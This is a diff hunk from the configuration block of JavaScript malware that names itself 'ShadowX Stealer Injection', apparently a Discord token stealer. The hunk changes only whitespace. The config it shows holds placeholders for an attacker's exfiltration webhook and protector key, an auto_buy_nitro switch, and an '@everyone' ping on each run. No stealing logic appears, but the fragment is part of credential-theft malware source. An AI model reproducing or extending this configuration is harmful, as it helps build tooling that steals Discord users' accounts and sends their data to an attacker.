@@ -9,7 +9,7 @@ const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
-  ping_on_run: true, 
+  ping_on_run: true,
   ping_val: '@everyone',
   embed_name: 'ShadowX Stealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1126257156371517461/1126322623136157707/logo_shadow.png'.replace(/ /g, '%20'), 
